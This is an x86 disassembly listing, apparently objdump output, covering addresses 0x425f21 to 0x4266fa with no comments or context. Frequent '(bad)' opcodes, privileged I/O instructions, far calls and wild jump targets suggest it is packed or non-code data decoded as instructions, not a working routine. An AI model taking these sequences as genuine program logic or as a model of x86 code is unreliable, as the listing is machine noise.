  425f21:	cwde   
  425f22:	pushf  
  425f23:	(bad)  
  425f24:	mov    dh,0x49
  425f26:	adc    DWORD PTR [eax],0x6d
  425f29:	loop   0x425ee3
  425f2b:	int3   
  425f2c:	test   al,0xcb
  425f2e:	sar    DWORD PTR [eax],0x66
  425f31:	dec    eax
  425f32:	dec    ecx
  425f33:	sti    
  425f34:	test   al,0x5a
  425f36:	lds    esp,FWORD PTR [ecx+ecx*2-0x1c]
  425f3a:	pop    edi
  425f3c:	out    0x97,al
  425f3e:	mov    BYTE PTR [edx+0x2a9a7e1c],0x8e
  425f45:	mov    dh,0x5b
  425f47:	std    
  425f48:	dec    edi
  425f49:	fld    QWORD PTR [ecx+0x166fca2c]
  425f4f:	call   0xdc7:0xd00bcdb
  425f56:	mov    eax,0x8a5a5d0
  425f5b:	nop
  425f5c:	stc    
  425f5d:	mov    bl,0xbe
  425f5f:	push   cs
  425f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f61:	mov    DWORD PTR [edx-0x4b32a3b6],edi
  425f67:	dec    ebp
  425f68:	add    ecx,DWORD PTR [ecx]
  425f6a:	cmp    edx,esp
  425f6c:	dec    ebx
  425f6d:	mov    ds:0x3b33f5d0,eax
  425f72:	push   es
  425f73:	jmp    0x151d601e
  425f78:	xchg   ebp,ebp
  425f7a:	ja     0x425f9c
  425f7c:	cmp    BYTE PTR [ebx+eiz*4-0x11],0xbd
  425f81:	aam    0x68
  425f83:	mov    al,0x12
  425f85:	pushf  
  425f86:	sbb    DWORD PTR [esi-0x41],edi
  425f89:	inc    esi
  425f8a:	stc    
  425f8b:	inc    esi
  425f8c:	add    DWORD PTR [edx+0x9e42c8e],ebp
  425f92:	outs   dx,BYTE PTR ds:[esi]
  425f93:	inc    eax
  425f94:	int    0x13
  425f96:	jp     0x425f5c
  425f98:	fmul   QWORD PTR [edi+0x16]
  425f9b:	or     al,0x6b
  425f9d:	xchg   ecx,eax
  425f9e:	loop   0x425f5f
  425fa0:	cmp    ecx,DWORD PTR [edx+edx*4+0x84844b8]
  425fa7:	jns    0x425fb5
  425fa9:	aam    0x79
  425fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fac:	shl    BYTE PTR [eax+0x4979c597],1
  425fb2:	push   edi
  425fb3:	fnstsw WORD PTR [ebp-0x3b]
  425fb6:	cmc    
  425fb7:	rol    BYTE PTR [edi],cl
  425fb9:	shl    BYTE PTR [edi],1
  425fbb:	lock fs or eax,0x953c678e
  425fc2:	sbb    eax,0xee8d6157
  425fc7:	rol    BYTE PTR [ecx-0x2236854d],0x36
  425fce:	mov    edx,0xb487c312
  425fd3:	fsubr  QWORD PTR [esi-0x7aeaaa5b]
  425fd9:	in     eax,0x85
  425fdb:	ins    BYTE PTR es:[edi],dx
  425fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fdd:	mov    ch,0x5b
  425fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fe0:	nop
  425fe1:	clc    
  425fe2:	pop    ds
  425fe3:	adc    eax,0xe5261e1
  425fe8:	arpl   WORD PTR [eax],di
  425fea:	and    al,0x2d
  425fec:	js     0x425f87
  425fee:	into   
  425fef:	sti    
  425ff0:	cmp    edi,esp
  425ff2:	dec    esp
  425ff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ff4:	test   al,0xb7
  425ff6:	popa   
  425ff7:	mov    dh,0x2
  425ff9:	int    0x33
  425ffb:	dec    esi
  425ffc:	dec    ebx
  425ffd:	data16 js 0x425fd7
  426000:	jg     0x425fb6
  426002:	pushf  
  426003:	daa    
  426004:	cli    
  426005:	jmp    0xedcbcc96
  42600a:	imul   BYTE PTR ds:0x1f13e17d
  426010:	es aad 0x1a
  426013:	test   bh,0x93
  426016:	jecxz  0x426087
  426018:	mov    ch,0x97
  42601a:	fld    DWORD PTR [esi]
  42601c:	mov    edi,0xaa8ca192
  426021:	data16 test BYTE PTR [ebp-0x6e],al
  426025:	jne    0x426008
  426027:	and    ecx,DWORD PTR [eax+0x1b]
  42602a:	sbb    esp,esp
  42602c:	xchg   ecx,eax
  42602d:	or     eax,0x8d0e7eed
  426032:	outs   dx,BYTE PTR ds:[esi]
  426033:	mov    bl,0x45
  426035:	rcr    ebp,cl
  426037:	loopne 0x42609f
  426039:	mov    edx,DWORD PTR [edx]
  42603b:	lahf   
  42603c:	mov    bl,0x5e
  42603e:	sub    ebp,DWORD PTR [ecx-0x778ff057]
  426044:	inc    edx
  426045:	add    ch,ch
  426047:	mov    ds:0xbe811872,eax
  42604c:	lods   al,BYTE PTR ds:[esi]
  42604d:	xor    al,0x9d
  42604f:	or     al,0x7
  426051:	dec    edx
  426052:	cmp    BYTE PTR ds:0x5fbf8301,0x6e
  426059:	mov    edx,0xe51bceb
  42605e:	mov    bh,0x23
  426060:	mov    esp,0x274cb97b
  426065:	mov    al,BYTE PTR [eax+0x55]
  426068:	cli    
  426069:	repnz sub esi,DWORD PTR [ebp+0x6a4402bf]
  426070:	(bad)  
  426071:	mov    ecx,0xe5e06e6b
  426076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426077:	in     al,dx
  426078:	iret   
  426079:	jecxz  0x425ffd
  42607b:	add    eax,0x528d94f5
  426080:	mov    WORD PTR [eax+0x60],fs
  426083:	arpl   WORD PTR [edx+0x213561b1],bp
  426089:	(bad)  
  42608a:	jle    0x426047
  42608c:	pop    es
  42608d:	xchg   ebx,eax
  42608e:	jmp    0x42610c
  426090:	mov    bl,0x8a
  426092:	test   DWORD PTR [edx+0x43],ebp
  426095:	mov    eax,ds:0x12e3e4f7
  42609a:	popf   
  42609b:	push   ebx
  42609c:	xchg   BYTE PTR [edi-0x454fed9b],ch
  4260a2:	cs or  edi,ebx
  4260a5:	inc    esi
  4260a6:	inc    edx
  4260a7:	or     al,0x19
  4260a9:	jmp    0x42602d
  4260ab:	test   al,0xd6
  4260ad:	sbb    eax,0x6e924678
  4260b2:	jmp    0x42fec4ff
  4260b7:	call   0x220c:0xd9e05fae
  4260be:	add    BYTE PTR [edi-0x50],cl
  4260c1:	add    eax,0x75943896
  4260c6:	jne    0x4260d1
  4260c8:	xchg   ebp,eax
  4260c9:	outs   dx,BYTE PTR ds:[esi]
  4260ca:	pop    ss
  4260cb:	add    eax,0x15ebc812
  4260d0:	das    
  4260d1:	sub    DWORD PTR [ebx+0x710d591],ebx
	...
  4260df:	add    BYTE PTR [eax],al
  4260e1:	sbb    ch,al
  4260e3:	mov    ebx,esp
  4260e5:	sti    
  4260e6:	call   FWORD PTR [edi-0x12]
  4260e9:	dec    edx
  4260ea:	pop    esi
  4260eb:	popa   
  4260ec:	sub    edx,DWORD PTR [ebx+0xf0c8745]
  4260f2:	fadd   DWORD PTR [ecx]
  4260f4:	add    BYTE PTR [esi-0x1afffffd],ch
  4260fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260fb:	xor    BYTE PTR [ebp*1+0x65939fb0],bh
  426102:	and    dh,BYTE PTR [edi-0x3a]
  426105:	fbstp  TBYTE PTR [edx+0x4bb60338]
  42610b:	mov    cl,0x3
  42610d:	fsubr  QWORD PTR [eax]
  42610f:	pop    ss
  426110:	repnz adc al,BYTE PTR [eax*8+0x4a67cfad]
  426118:	std    
  426119:	mov    edi,0xf6bebd15
  42611e:	sahf   
  42611f:	fcmovbe st,st(6)
  426121:	aad    0xcd
  426123:	es pop ebp
  426125:	repnz push ebp
  426127:	jmp    0x651ac76
  42612c:	mov    WORD PTR [esi-0x7bcace8c],?
  426132:	jecxz  0x426189
  426134:	push   esp
  426135:	mov    DWORD PTR [ecx+esi*8],edx
  426138:	xchg   BYTE PTR ds:0xa1de2a1f,ah
  42613e:	jns    0x426170
  426140:	imul   ecx,DWORD PTR [esi],0x87721c70
  426146:	sar    bl,1
  426148:	cmp    BYTE PTR [edx+0x1cf7bd48],0xbb
  42614f:	lods   al,BYTE PTR ds:[esi]
  426150:	hlt    
  426151:	lods   al,BYTE PTR ds:[esi]
  426152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426153:	adc    BYTE PTR [esi],bh
  426155:	dec    ebp
  426156:	add    DWORD PTR [edx+0x7d],0x7d2a0ac
  42615d:	adc    eax,0xac25da24
  426162:	cmp    bl,BYTE PTR [edi]
  426164:	inc    ebx
  426165:	mov    ebp,0x2e86ef54
  42616a:	inc    eax
  42616b:	ins    DWORD PTR es:[edi],dx
  42616c:	inc    edx
  42616d:	inc    ebx
  42616e:	fistp  QWORD PTR [edx+0x152f0dec]
  426174:	hlt    
  426175:	dec    DWORD PTR [esi+0x3f]
  426178:	push   edi
  426179:	and    BYTE PTR [esi+esi*2],ch
  42617c:	clc    
  42617d:	dec    esi
  42617e:	lahf   
  42617f:	xlat   BYTE PTR ds:[ebx]
  426180:	pop    ds
  426181:	and    edx,DWORD PTR [ecx-0x3693ddaf]
  426187:	jne    0x426197
  426189:	cmc    
  42618a:	push   cs
  42618b:	daa    
  42618c:	ss jge 0x4261cc
  42618f:	and    dl,ch
  426191:	add    al,0xf0
  426193:	mov    WORD PTR [ecx+0x12a6cf85],fs
  426199:	and    BYTE PTR ds:0x39d027af,bh
  42619f:	out    0x2b,eax
  4261a1:	pop    ss
  4261a2:	sahf   
  4261a3:	je     0x426152
  4261a5:	mov    cl,0xc2
  4261a7:	and    al,0x10
  4261a9:	in     al,0xfe
  4261ab:	dec    ebx
  4261ac:	loop   0x426136
  4261ae:	es ds sub eax,esi
  4261b2:	pop    ss
  4261b3:	xchg   edx,eax
  4261b4:	cmp    dh,bl
  4261b6:	adc    BYTE PTR [edi+0x3ad82705],0xa8
  4261bd:	jb     0x426208
  4261bf:	push   es
  4261c0:	mov    bh,0x83
  4261c2:	enter  0x850e,0xa8
  4261c6:	test   eax,0x5932cbe7
  4261cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261cc:	xchg   esp,eax
  4261cd:	stos   DWORD PTR es:[edi],eax
  4261ce:	das    
  4261cf:	arpl   WORD PTR es:[ebx-0x379204b1],bx
  4261d6:	popf   
  4261d7:	scas   eax,DWORD PTR es:[edi]
  4261d8:	js     0x426241
  4261da:	in     al,0xb5
  4261dc:	sub    al,0xd
  4261de:	push   ss
  4261df:	arpl   bx,bx
  4261e1:	aas    
  4261e2:	mov    ebx,0x90785bea
  4261e7:	sbb    eax,0x6a4c5d84
  4261ec:	std    
  4261ed:	mov    bh,0xa7
  4261ef:	mov    eax,ds:0x4e6ba457
  4261f4:	cmp    dl,BYTE PTR [ebx-0x66]
  4261f7:	aas    
  4261f8:	fisubr WORD PTR [esi+0x5b5540b3]
  4261fe:	ret    0xab0d
  426201:	cmp    DWORD PTR ds:0xee9217c7,0xffffffa7
  426208:	das    
  426209:	cdq    
  42620a:	jmp    0x4261be
  42620c:	inc    esi
  42620d:	nop
  42620e:	push   ss
  42620f:	dec    edx
  426210:	sub    DWORD PTR [edi+eiz*8+0x64bbf759],esi
  426217:	add    bl,bh
  426219:	(bad)  
  42621b:	repnz mov eax,ds:0x5b4a156c
  426221:	and    dl,ch
  426223:	cmc    
  426224:	cmp    edi,DWORD PTR [ecx]
  426226:	xchg   edx,eax
  426227:	ss aas 
  426229:	or     dl,al
  42622b:	xor    al,0x91
  42622d:	iret   
  42622e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426230:	cmp    esp,0x49
  426233:	sbb    al,0x38
  426235:	pop    edx
  426236:	popf   
  426237:	hlt    
  426238:	mov    ah,0xc1
  42623a:	into   
  42623b:	mov    WORD PTR [eax-0x2087ed42],ds
  426241:	mov    eax,0x6d941e77
  426246:	ret    
  426247:	fwait
  426248:	sbb    esi,DWORD PTR [edx]
  42624a:	mov    eax,edx
  42624c:	aaa    
  42624d:	inc    esp
  42624e:	dec    edi
  42624f:	iret   
  426250:	jb     0x426202
  426252:	in     al,0x18
  426254:	imul   eax,DWORD PTR [edi+0x47a27be6],0x9dba30ca
  42625e:	inc    ecx
  42625f:	dec    edi
  426260:	mov    al,ds:0xe785d863
  426265:	mov    cl,0xd4
  426267:	dec    esp
  426268:	pop    ds
  426269:	outs   dx,DWORD PTR ds:[esi]
  42626a:	xor    bl,cl
  42626c:	add    DWORD PTR [esi+ecx*2],esp
  42626f:	pusha  
  426270:	fidivr DWORD PTR fs:[edx-0x3df6b3e3]
  426277:	xchg   DWORD PTR [ebp-0x59],ecx
  42627a:	cmp    eax,edx
  42627c:	sub    esp,DWORD PTR [edx+0x4c0e763]
  426282:	adc    eax,0xa747d3eb
  426287:	push   ebp
  426288:	cmp    esp,DWORD PTR ds:0x373a9fa8
  42628e:	sbb    eax,0xa81df441
  426293:	mov    fs,edx
  426295:	aad    0x9
  426297:	or     BYTE PTR [eax+esi*1-0x66],0xdc
  42629c:	mov    bh,0x6
  42629e:	dec    edx
  42629f:	stos   BYTE PTR es:[edi],al
  4262a0:	jg     0x426280
  4262a2:	iret   
  4262a3:	jb     0x426299
  4262a5:	xlat   BYTE PTR ds:[ebx]
  4262a6:	in     al,dx
  4262a7:	ret    0xc04c
  4262aa:	loop   0x4262f0
  4262ac:	add    BYTE PTR [edx],ch
  4262ae:	outs   dx,BYTE PTR ds:[esi]
  4262af:	std    
  4262b0:	mov    esp,0xc6c58526
  4262b5:	fs mov bl,0x82
  4262b8:	and    esi,eax
  4262ba:	(bad)  [ecx-0x7ce0534]
  4262c0:	jmp    0x4262d5
  4262c2:	pusha  
  4262c3:	leave  
  4262c4:	sar    BYTE PTR [edi-0x25],1
  4262c7:	stos   DWORD PTR es:[edi],eax
  4262c8:	data16 cmp BYTE PTR [ebp+0x49],ch
  4262cc:	inc    esp
  4262cd:	imul   edi,DWORD PTR [ecx-0x9],0x6137d2f3
  4262d4:	mov    BYTE PTR [ebp-0x8],ah
  4262d7:	dec    esi
  4262d8:	adc    eax,0x738ea13e
  4262dd:	pop    ds
  4262de:	xchg   esp,eax
  4262df:	xor    eax,0x5cdf3784
  4262e4:	sbb    DWORD PTR [eax-0x174e25d9],0xbab359b7
  4262ee:	pop    edx
  4262ef:	scas   eax,DWORD PTR es:[edi]
  4262f0:	fcmovu st,st(0)
  4262f2:	pushf  
  4262f3:	xchg   edx,eax
  4262f4:	pop    esi
  4262f5:	mov    ebp,0xf1f0fce8
  4262fa:	addr16 mov eax,ds:0x5b9a
  4262fe:	or     eax,0x72acb04c
  426303:	xor    DWORD PTR [ebp+0x2f],ecx
  426306:	cld    
  426307:	dec    esp
  426308:	xchg   esi,eax
  426309:	mov    ecx,0x60ebbc61
  42630e:	and    DWORD PTR [edx-0x66],edx
  426311:	retf   
  426312:	std    
  426313:	mov    ch,0xf0
  426315:	inc    esp
  426316:	(bad)  
  426317:	imul   esp,DWORD PTR [esi-0x629eb0f9],0xdc405428
  426321:	pop    esp
  426322:	sti    
  426323:	adc    ah,ah
  426325:	fs loope 0x42631d
  426328:	adc    ch,ch
  42632a:	inc    esp
  42632b:	addr16 fyl2x 
  42632e:	fld    QWORD PTR [ebp+0x62877a62]
  426334:	xor    DWORD PTR [esi],esi
  426336:	nop
  426337:	and    esi,edx
  426339:	add    BYTE PTR [ecx+0x610b3c9b],dl
  42633f:	inc    ebp
  426340:	mov    WORD PTR [eax-0x6],es
  426343:	ret    
  426344:	jne    0x42630f
  426346:	test   al,0xbc
  426348:	pop    ecx
  426349:	xchg   ebp,eax
  42634a:	dec    ebp
  42634b:	push   edi
  42634c:	sbb    dl,bh
  42634e:	mov    al,0x3d
  426350:	adc    BYTE PTR [esi-0x5c],dh
  426353:	mov    DWORD PTR [ebx],eax
  426355:	mov    bl,0xca
  426357:	inc    edi
  426358:	mov    BYTE PTR [ebp+0x5c1b3041],al
  42635e:	ins    DWORD PTR es:[edi],dx
  42635f:	std    
  426360:	(bad)  
  426361:	mov    cl,bl
  426363:	push   0xfffffff0
  426365:	sub    bh,ch
  426367:	push   cs
  426368:	xchg   edi,eax
  426369:	data16 test dh,bl
  42636c:	mov    ch,0x6f
  42636e:	popf   
  42636f:	pop    DWORD PTR [eax-0x30]
  426372:	sub    BYTE PTR [ecx+0x361b9937],ah
  426378:	pop    ecx
  426379:	arpl   WORD PTR [edi],di
  42637b:	or     bl,BYTE PTR [eax+eax*2-0x1b36fca2]
  426382:	inc    DWORD PTR [ebp+0x1552c8ba]
  426388:	mov    BYTE PTR [eax+0x30],ch
  42638b:	push   cs
  42638c:	mov    bl,0x8a
  42638e:	test   eax,0xba493dd1
  426393:	in     al,dx
  426394:	(bad)  
  426395:	out    0x4e,eax
  426397:	not    DWORD PTR [esi-0x8]
  42639a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42639b:	cmp    dl,ah
  42639d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42639f:	pop    es
  4263a0:	xor    DWORD PTR [esi],eax
  4263a2:	sub    eax,0x87b7eb06
  4263a7:	push   cs
  4263a8:	stc    
  4263a9:	push   cs
  4263aa:	lahf   
  4263ab:	cmp    edx,DWORD PTR [eax+0x61]
  4263ae:	push   ebp
  4263af:	adc    BYTE PTR [edi+esi*8],dl
  4263b2:	mov    eax,0x8a1596b2
  4263b7:	lods   eax,DWORD PTR ds:[esi]
  4263b8:	es repz neg esp
  4263bc:	mov    eax,ds:0xaa135ceb
  4263c1:	mov    WORD PTR [ebx-0x439f5b24],es
  4263c7:	add    DWORD PTR [esi+0x73],ebp
  4263ca:	lock dec ecx
  4263cc:	mov    bh,0x63
  4263ce:	sbb    eax,0x9b06a205
  4263d3:	fwait
  4263d4:	(bad)  
  4263d5:	es mov edi,0x8d20897a
  4263db:	call   0x8ebc:0xc9e7e8bb
  4263e2:	jecxz  0x42637b
  4263e4:	leave  
  4263e5:	aas    
  4263e6:	les    eax,FWORD PTR [ecx-0x45]
  4263e9:	push   edx
  4263ea:	push   edx
  4263eb:	jne    0x4263d1
  4263ed:	lahf   
  4263ee:	jne    0x42643e
  4263f0:	jo     0x426403
  4263f2:	call   edx
  4263f4:	idiv   DWORD PTR [esi-0x12f29da1]
  4263fa:	(bad)  
  4263fc:	pop    ecx
  4263fd:	xlat   BYTE PTR ds:[ebx]
  4263fe:	xor    edx,DWORD PTR [ecx+0x6689bfcc]
  426404:	scas   eax,DWORD PTR es:[edi]
  426405:	or     esp,DWORD PTR [esi]
  426407:	dec    eax
  426408:	out    dx,al
  426409:	rcl    DWORD PTR [ecx],1
  42640b:	pop    ecx
  42640c:	fdiv   QWORD PTR [esi]
  42640e:	xor    DWORD PTR [ebx-0xedb9e1c],ecx
  426414:	cdq    
  426415:	and    eax,0x4025f66f
  42641a:	popa   
  42641b:	mov    ah,0x3c
  42641d:	pop    esi
  42641e:	mov    ah,0xe0
  426420:	pop    es
  426421:	scas   al,BYTE PTR es:[edi]
  426422:	adc    BYTE PTR [eax+0x36],0x42
  426426:	fimul  DWORD PTR [edx+0x786b5d2d]
  42642c:	dec    ebx
  42642d:	or     dh,BYTE PTR [eax-0x18072c3e]
  426433:	fcmovbe st,st(2)
  426435:	and    BYTE PTR [esi],0xe7
  426438:	shr    DWORD PTR [esi+0x463c013e],0xd6
  42643f:	adc    al,0xc6
  426441:	or     bh,BYTE PTR [edi-0x28443ce8]
  426447:	and    al,0xe3
  426449:	or     ebp,0x66
  42644c:	call   0xf03bc442
  426451:	or     eax,0x3e9a0774
  426456:	jp     0x42649a
  426458:	sbb    bh,BYTE PTR [ebx+0x1107d38f]
  42645e:	lods   eax,DWORD PTR ds:[esi]
  42645f:	test   esp,eax
  426461:	(bad)  
  426462:	push   DWORD PTR [ebx+0x1e]
  426465:	xor    edi,esi
  426467:	push   ss
  426468:	or     BYTE PTR [edx],ch
  42646a:	sbb    eax,0xfdffa5f7
  42646f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426470:	out    dx,al
  426471:	mov    DWORD PTR [ebp+0x7b4448c3],ebx
  426477:	out    0xcc,al
  426479:	add    dl,al
  42647b:	xchg   ecx,eax
  42647c:	icebp  
  42647d:	les    ecx,FWORD PTR [esp+ebp*1]
  426480:	jb     0x426451
  426482:	or     BYTE PTR [ebx+0x1e6b67b3],0xf1
  426489:	or     eax,0x1fe4e23c
  42648e:	and    BYTE PTR [ebx],0xa5
  426491:	and    DWORD PTR [ebp-0x5c8647bf],ecx
  426497:	xor    ebx,DWORD PTR [ebx+0x76]
  42649a:	sub    al,BYTE PTR [ecx+0x30]
  42649d:	adc    dl,BYTE PTR [edx]
  42649f:	sbb    DWORD PTR [edx-0x172d45bb],ebx
  4264a5:	in     eax,0x73
	...
  4264af:	add    BYTE PTR [eax],al
  4264b1:	loop   0x42652e
  4264b3:	push   ecx
  4264b4:	data16 fldcw WORD PTR [esi-0x9]
  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     ebx,ebx
  4264be:	call   0x1:0xdbbd756d
  4264c5:	scas   al,BYTE PTR es:[edi]
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    BYTE PTR [esi+0x7ebdc70],ch
  4264ce:	jo     0x426515
  4264d0:	stos   DWORD PTR es:[edi],eax
  4264d1:	jb     0x426536
  4264d3:	xor    edi,ebp
  4264d5:	jle    0x42646e
  4264d7:	push   0xffffffb7
  4264d9:	jo     0x426501
  4264db:	jg     0x42652c
  4264dd:	cli    
  4264de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264df:	mov    ch,ch
  4264e1:	push   0x4dd7ec13
  4264e6:	pop    ss
  4264e7:	mov    eax,0xc1375237
  4264ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264ed:	sub    DWORD PTR [esi-0x7f0ce7d0],ebp
  4264f3:	or     BYTE PTR [edi-0x1a],bl
  4264f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264f7:	push   cs
  4264f8:	and    dh,BYTE PTR [edi]
  4264fa:	mov    dl,0x45
  4264fc:	icebp  
  4264fd:	xchg   edx,eax
  4264fe:	xchg   ax,ax
  426500:	dec    edx
  426501:	cmp    al,0x97
  426503:	jmp    0xc315b1a6
  426508:	retf   
  426509:	out    0x87,eax
  42650b:	clc    
  42650c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42650d:	in     al,0xf7
  42650f:	mov    al,ds:0xfc43d47e
  426514:	adc    ebx,DWORD PTR [edx]
  426516:	add    eax,0xfe911811
  42651b:	shl    BYTE PTR [ebx+eiz*4+0x43056b1c],0xc7
  426523:	mov    ah,0x21
  426525:	pop    ds
  426526:	(bad)  
  426528:	jmp    0xb81aba70
  42652d:	icebp  
  42652e:	and    edi,DWORD PTR ds:0x2b18469e
  426534:	aaa    
  426535:	jno    0x426536
  426537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426538:	xchg   esi,eax
  426539:	es out 0xab,eax
  42653c:	sti    
  42653d:	rcr    DWORD PTR [eax],cl
  42653f:	push   0xd83ff24
  426544:	int3   
  426545:	gs jmp 0x815d988b
  42654b:	dec    ebp
  42654c:	daa    
  42654d:	sbb    eax,0x803c3cff
  426552:	scas   al,BYTE PTR es:[edi]
  426553:	test   BYTE PTR [ebp+0x29],bl
  426556:	arpl   WORD PTR [esi],cx
  426558:	addr16 mov ah,0x28
  42655b:	imul   eax,DWORD PTR ds:0x7010b67b,0x3b080e2
  426565:	inc    ecx
  426566:	jb     0x426557
  426568:	aad    0x53
  42656a:	in     al,dx
  42656b:	adc    eax,0xf524ec74
  426570:	xchg   ebx,eax
  426571:	fld    TBYTE PTR [eax]
  426573:	pusha  
  426574:	fisttp QWORD PTR [ebx+0x5a]
  426577:	mov    eax,0xceab75af
  42657c:	loope  0x426549
  42657e:	mov    BYTE PTR [ebx+edi*2],al
  426581:	mov    cs,WORD PTR [ecx+0x72853fc0]
  426587:	cmp    bl,BYTE PTR [eax+ebx*4-0x58]
  42658b:	mov    esi,ebx
  42658d:	jg     0x426591
  42658f:	test   al,0x1
  426591:	xchg   ebx,eax
  426592:	retf   0x1a7d
  426595:	imul   eax,DWORD PTR [ebp-0x3f],0x78
  426599:	lods   eax,DWORD PTR ds:[esi]
  42659a:	mov    dh,0x57
  42659c:	jecxz  0x4265f6
  42659e:	and    ebx,DWORD PTR [ebp-0x6b]
  4265a1:	and    ecx,DWORD PTR [eax]
  4265a3:	mov    ch,0xb
  4265a5:	inc    ecx
  4265a6:	lea    esi,[eax+0x744a6200]
  4265ac:	mov    eax,ds:0xc980dc03
  4265b1:	sub    DWORD PTR [edi],ecx
  4265b3:	inc    ebp
  4265b4:	fisttp QWORD PTR [ebp-0x40]
  4265b7:	test   esi,ebx
  4265b9:	mov    ah,BYTE PTR [ebx-0x1d]
  4265bc:	aad    0x88
  4265be:	jmp    0x1152e768
  4265c3:	pushf  
  4265c4:	sub    BYTE PTR [ebx-0x35],dh
  4265c7:	pop    ebx
  4265c8:	dec    esp
  4265c9:	ret    
  4265ca:	and    BYTE PTR [edi],bh
  4265cc:	pop    esp
  4265cd:	xchg   esp,eax
  4265ce:	rcl    DWORD PTR [ebp+0x3b0bfe7],0x55
  4265d5:	push   0x2b974eb9
  4265da:	pop    ecx
  4265db:	in     eax,0x85
  4265dd:	lds    ebp,FWORD PTR [edx-0x72]
  4265e0:	mov    ebp,0xfd67f15d
  4265e5:	aam    0xd3
  4265e7:	xchg   BYTE PTR [esi-0x44],dh
  4265ea:	xchg   esi,eax
  4265eb:	sbb    DWORD PTR [ebp-0x144d2175],esp
  4265f1:	cwde   
  4265f2:	adc    bh,dl
  4265f4:	stos   BYTE PTR es:[edi],al
  4265f5:	xchg   ecx,eax
  4265f6:	xor    esp,DWORD PTR [ebx-0x69]
  4265f9:	(bad)  
  4265fa:	dec    esi
  4265fb:	(bad)
  4265ff:	add    DWORD PTR [esi-0x739d661d],0x724b2ea7
  426609:	or     eax,0x1b4c8581
  42660e:	push   esp
  42660f:	inc    esp
  426610:	push   eax
  426611:	hlt    
  426612:	or     BYTE PTR ds:0xef714bb4,dh
  426618:	jecxz  0x426688
  42661a:	shl    DWORD PTR [eax],cl
  42661c:	test   al,0xc6
  42661e:	das    
  42661f:	cmp    BYTE PTR [edx],ch
  426621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426622:	fcomp  DWORD PTR [ebx+0x4422568c]
  426628:	in     al,dx
  426629:	retf   0x1d00
  42662c:	out    dx,al
  42662d:	or     DWORD PTR [ebp-0x29],edx
  426630:	jmp    0x3b031a67
  426635:	and    bl,BYTE PTR [ebx+eiz*4]
  426638:	icebp  
  426639:	dec    ebp
  42663a:	outs   dx,DWORD PTR ds:[esi]
  42663b:	jne    0x42669a
  42663d:	xchg   esp,eax
  42663e:	sub    edx,DWORD PTR [ebx+ebx*2]
  426641:	cmc    
  426642:	cmp    DWORD PTR [ebx],edx
  426644:	loopne 0x426655
  426646:	add    eax,0xa1703ce
  42664b:	jo     0x4266b1
  42664d:	mov    ch,0xa1
  42664f:	mov    fs,WORD PTR [edx+edi*2-0x4c6eedef]
  426656:	out    0x7e,eax
  426658:	xchg   ecx,eax
  426659:	mov    edi,0xabd8e27f
  42665e:	inc    esi
  42665f:	adc    esi,DWORD PTR [ebx]
  426661:	push   esp
  426662:	mov    bl,0xde
  426664:	(bad)  
  426665:	cmp    ch,BYTE PTR [esi]
  426667:	inc    BYTE PTR [esi-0x5a1706e0]
  42666d:	out    dx,al
  42666e:	aad    0x7a
  426670:	push   ds
  426671:	jl     0x42663e
  426673:	push   cs
  426674:	dec    eax
  426675:	cmp    al,0x8b
  426677:	or     ebp,DWORD PTR [edi-0x7bcbf0ef]
  42667d:	imul   ebp,edx,0xfffffff8
  426680:	hlt    
  426681:	lods   al,BYTE PTR ds:[esi]
  426682:	pop    ebp
  426683:	rcl    BYTE PTR [edx-0x4],cl
  426686:	sti    
  426687:	es inc edx
  426689:	or     al,0x74
  42668b:	jmp    0x426631
  42668d:	sub    bl,dl
  42668f:	pop    ebp
  426690:	popf   
  426691:	mov    bh,0x42
  426693:	inc    edi
  426694:	dec    edi
  426695:	into   
  426696:	scas   al,BYTE PTR es:[edi]
  426697:	jle    0x4266f0
  426699:	and    bh,BYTE PTR [esi-0x8]
  42669c:	fwait
  42669d:	add    BYTE PTR [esi-0x66],0xbb
  4266a1:	stos   DWORD PTR es:[edi],eax
  4266a2:	leave  
  4266a3:	les    esp,FWORD PTR [eax+0x2e688d0f]
  4266a9:	mov    cl,0x41
  4266ab:	stos   BYTE PTR es:[edi],al
  4266ac:	and    bh,BYTE PTR [esi+ebx*2-0x10]
  4266b0:	or     eax,0xbf358aff
  4266b5:	fs daa 
  4266b7:	adc    DWORD PTR [ecx-0x5a],0xffffff80
  4266bb:	mov    eax,0x1ceaef5d
  4266c0:	sub    al,0xa8
  4266c2:	xchg   BYTE PTR [ecx],cl
  4266c4:	adc    esi,DWORD PTR [edi+0x6c]
  4266c7:	mov    esi,ds
  4266c9:	mov    bh,0x49
  4266cb:	mov    edx,DWORD PTR [edi+0x68]
  4266ce:	mov    ah,0x42
  4266d0:	jmp    0x4266b8
  4266d2:	xlat   BYTE PTR ds:[ebx]
  4266d3:	test   al,0x8e
  4266d5:	mov    al,ds:0x937f9502
  4266da:	call   0xb5d8:0x714b49e4
  4266e1:	xchg   ebp,eax
  4266e2:	mov    DWORD PTR [eax],ebp
  4266e4:	add    ecx,DWORD PTR ds:0xd579ad89
  4266ea:	mov    dh,BYTE PTR [esi+esi*2]
  4266ed:	pop    esp
  4266ee:	mov    WORD PTR [edx+0x7dd92160],?
  4266f4:	cmp    al,0x5a
  4266f6:	(bad)  
  4266f7:	int3   
  4266f8:	in     eax,0x89
  4266fa:	das    
